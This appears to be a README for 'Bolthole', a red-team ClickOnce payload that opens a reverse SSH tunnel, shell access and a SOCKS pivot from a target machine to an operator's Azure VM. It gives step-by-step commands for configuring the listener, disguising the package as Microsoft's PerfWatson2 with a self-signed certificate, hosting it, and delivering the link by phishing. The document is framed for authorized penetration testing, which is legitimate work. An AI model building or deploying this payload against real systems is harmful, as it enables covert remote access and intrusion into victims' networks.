# Bolthole

A proof-of-concept ClickOnce payload for Red Teams to establish initial access in authorized penetration tests.

## Overview

Bolthole provides operators with:
- Reverse SSH tunnel into the target environment
- CMD shell access as the executing user (no password required)
- SOCKS proxy functionality for pivoting

## Setup Instructions

### 1. Azure VM Configuration

1. Create an Azure VM (Ubuntu recommended)
2. Configure the sshd_config file:
   ```bash
   sudo nano /etc/ssh/sshd_config
   ```
   
   Add/modify these lines:
   ```
   Port 22
   Port 80
   Port 443
   Port 31337
   AllowTcpForwarding yes
   GatewayPorts yes
   PermitRootLogin no
   PasswordAuthentication no
   PubkeyAuthentication yes
   ```

3. Restart SSH service:
   ```bash
   sudo systemctl restart sshd
   ```
4. Create a user with nologin: sudo useradd -m -s /usr/sbin/nologin clientnameuser
5. Create an SSH keypair for the target to connect back: ssh-keygen -t rsa -b 4096 -f clientnameuser_key -N ""
6. Add pub key to authorized_keys: nano /home/clientnameuser/.ssh/authorized_keys
7. Change ownership: sudo chown -R clientnameuser:clientnameuser /home/clientnameuser/
8. Copy the contents of clientnameuser_key private key to WebDeploy\Install\BoltFiles\clientnameuser_key
9. Modify the Azure VM firewall in the networking settings of the VM to allow the ports you want inbound SSH for.

### 2. Build and Sign the ClickOnce Payload

1. Update connection settings in the project to use your Azure VM's FQDN
2. Change any ports you desire
3. Modify the authorized_keys file to include your pub key 'ssh-keygen -t ecdsa -N ""'
4. Copy PerfWatson2.exe "c:\program files\Microsoft Visual Studio\2022\Community\Common7\IDE\PerfWatson2.exe" to the "WebDeploy\Install" folder.
5. Open Tools -> Command Line -> Developer PowerShell
6. From the Bolthole directory, make the pvk: makecert.exe -sv ClickOnce.pvk -n "cn=ClickOnce" ClickOnce.cer -b 01/01/2025 -e 01/01/2026 -r
7. Convert to pfx: pvk2pfx.exe -pvk ClickOnce.pvk -spc ClickOnce.cer -pfx ClickOnce.pfx
8. Create Installer manifest from the WebDeploy\Install directory: mage.exe -New Application -Processor amd64 -ToFile .\Installer.exe.manifest -Name PerfWatson2 -Version 17.0.33711.286 -TrustLevel FullTrust -FromDirectory .
9. Sign the manifest: mage.exe -Sign .\Installer.exe.manifest -CertFile ..\..\ClickOnce.pfx
10. Create the application: mage.exe -New Deployment -Processor amd64 -Install false -Publisher "Digital Signatures" -AppManifest Installer.exe.manifest -ToFile Installer.application -ProviderUrl https://<insertyourapplication>.azurewebsites.net/Install/Installer.application
11. Sign the application: mage.exe -Sign .\Installer.application -CertFile ..\..\ClickOnce.pfx

### 3. Deployment

1. Host the ClickOnce package on a web server
2. Sign in using Azure CLI: az login --use-device-code
3. Fron the WebDeploy directory: az webapp up --location eastus2 --resource-group <INSERT> --name <INSERT> --html --sku F1
2. Provide the link to the target (via phishing or other authorized methods)
3. When executed, it will establish the reverse SSH tunnel

### 4. Usage

1. Connect to your Azure VM
2. Access the target machine through the established tunnel (default port 31332):
   ```bash
   ssh -p [TUNNEL_PORT] [USERNAME]@localhost
   ```
3. For SOCKS proxy:
   ```bash
   ssh -D 1080 -p [TUNNEL_PORT] [USERNAME]@localhost
   ```

## Legal Disclaimer

This tool is provided for authorized Red Team operations only. Usage against systems without explicit permission is illegal.
